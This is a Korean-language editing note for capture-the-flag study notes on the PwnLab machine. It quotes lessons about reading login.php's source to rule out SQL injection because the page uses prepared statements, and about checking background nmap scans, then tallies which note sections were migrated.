> **반대 방향도 성립한다 — 소스를 먼저 읽고 시도조차 안 하는 것이 맞을 때도 있다.** [[PwnLab]] `login.php` 는 `mysqli->prepare()`+`bind_param()` 을 정확히 씀. 소스를 확보한 상태였으므로 SQLi 페이로드를 하나도 던지지 않고 배제 — **웹 소스를 읽는 데 쓴 1분이 SQLi 시도 20분(추정)을 아꼈음.** 소스가 없을 때만 블랙박스로 두드려볼 이유가 생김.

**지우기 전 원문**(구 6장 막다른 길 중 관련 줄 + 구 7장 #9, 노트에서 삭제):
```
- **login.php SQLi** — 소스를 읽어보니 prepared statement 라 시도조차 안 했다. **소스를 먼저 읽은 것이 여기서 시간을 벌었다.**
```
```
9. **시간 배분** — 웹 소스를 읽는 데 쓴 1분이 SQLi 시도 20분을 아꼈다. 반대로 tmux 에 던져놓은 nmap 을 확인 안 한 10분은 순손실이었다. **백그라운드 작업은 던진 직후와 몇 분 뒤 두 번 확인하라.**
```
(⚠️ 위 인용은 §3 과 부분 중복 — §3 에서 이미 login.php SQLi 항목을 인용했으므로 반영자는 **한 번만** 노트에서 삭제할 것. 여기서는 이관 대상 문구를 다시 표시하기 위해 재인용함.)

---

## 검산

- 노트에서 삭제한 구 장(0장 일부·4-1 콜아웃·6장 전체 5항목·7장 10항목 중 이관분·9장 참고자료는 유지)의 텍스트 블록 수: **11개**
- 위 제안 항목 수(1~13, 단 13번은 3번과 중복 삭제 대상이라 순증 아님): **12건 실질 append 제안**
- 이관 손실 점검 — 원문 코드블록·출력·출처 경로는 전부 "지우기 전 원문" 절에 원문 그대로 인용함. 요약치환 없음.
